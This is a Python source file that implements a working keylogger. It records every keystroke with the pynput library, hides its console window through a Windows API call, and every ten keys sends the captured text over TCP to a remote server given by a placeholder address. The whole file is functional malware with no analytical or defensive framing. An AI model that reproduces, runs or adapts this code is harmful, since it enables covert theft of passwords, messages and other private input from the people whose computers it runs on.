import pynput
import socket
import ctypes

keystroke_count = 0

# Server address and port
SERVER_ADDRESS = 'SERVER_IP'  # Replace with the server's IP address
SERVER_PORT = 9999  # Must match the server port

# Initialize a list
keystrokes = []

def send_keystrokes_to_server(data):
    """Send keystrokes to the server."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((SERVER_ADDRESS, SERVER_PORT))
            s.sendall(data.encode('utf-8'))
        except Exception as e:
            print(f"Error sending data: {e}")

def on_press(key):
    global keystrokes
    try:
        # Store character keys
        keystrokes.append(key.char)
    except AttributeError:
        # Store special keys like Space, Enter, etc.
        if key == pynput.keyboard.Key.space:
            keystrokes.append(' ')  # Add a space for space key
        elif key == pynput.keyboard.Key.enter:
            keystrokes.append('\n')  # New line for Enter key
        elif key == pynput.keyboard.Key.backspace:
            keystrokes.append('[BACKSPACE]')  # Handle backspace
        else:
            keystrokes.append(f'[{str(key)}]')  # Store other special keys
    
    # Send keystrokes to the server periodically (or at key events)
    if len(keystrokes) >= 10:  # Example condition to send data
        send_keystrokes_to_server(''.join(keystrokes))
        keystrokes = []  # Reset after sending

def on_release(key):
    global keystroke_count
    keystroke_count += 1  # Track number of keystrokes

    # Stop listener if Esc is pressed
    if key == pynput.keyboard.Key.esc:
        return False

# Hide Window
ctypes.windll.kernel32.FreeConsole()

# Start the keylogger
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
